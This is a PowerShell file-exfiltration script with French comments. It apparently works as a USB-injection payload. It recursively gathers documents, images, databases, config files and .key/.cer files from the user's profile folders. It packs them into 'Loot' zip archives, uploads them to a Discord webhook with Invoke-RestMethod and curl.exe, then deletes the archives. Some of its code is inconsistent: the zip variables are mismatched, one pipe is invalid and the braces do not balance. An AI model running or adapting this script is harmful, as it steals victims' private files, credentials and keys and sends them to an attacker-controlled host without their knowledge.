$hookurl = "$dc"
# shortened URL Detection
if ($hookurl.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $hookurl = (irm $hookurl).url}

Function Exfiltrate {

param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 25MB
$currentZipSize = 0
$index = 1
$zipFilePath ="$env:temp/Loot$index.zip"

If($Path -ne $null){
$foldersToSearch = "$env:USERPROFILE\"+$Path
}else{
$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
}

If($FileType -ne $null){
$fileExtensions = "*."+$FileType
}else {
$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
}

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse

        foreach ($file in $files) {
            $fileSize = $file.Length

            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipFile.Dispose()
                $currentZipSize = 0

                # Construisez le message incluant le dossier utilisateur
                $message = "Fichiers de $userProfile à envoyer : $zipFilePath"

                try {
                    # Envoyez le message et le fichier au webhook Discord
                    Invoke-RestMethod -Uri $hookurl -Method Post -Body @{
                        content = $message
                        file = Get-Item $zipFilePath | [System.IO.File]::ReadAllBytes($zipFilePath)
                    }
                } catch {
                    Write-Host "Erreur lors de l'envoi du fichier au webhook : $_"
                    # Gérer l'erreur selon les besoins
                }

                Remove-Item -Path $zipFilePath -Force
                Start-Sleep -Seconds 1

                $index++
                $zipFilePath = Join-Path $env:temp "Loot$index.zip"
                $zipFile = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }

            $entryName = $file.FullName.Substring($folder.Length + 1)
            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipFile, $file.FullName, $entryName)
            $currentZipSize += $fileSize
        }
$zipArchive.Dispose()
curl.exe -F file1=@"$zipFilePath" $hookurl
Remove-Item -Path $zipFilePath -Force
Write-Output "$env:COMPUTERNAME : Exfiltration Complete."
}

Exfiltrate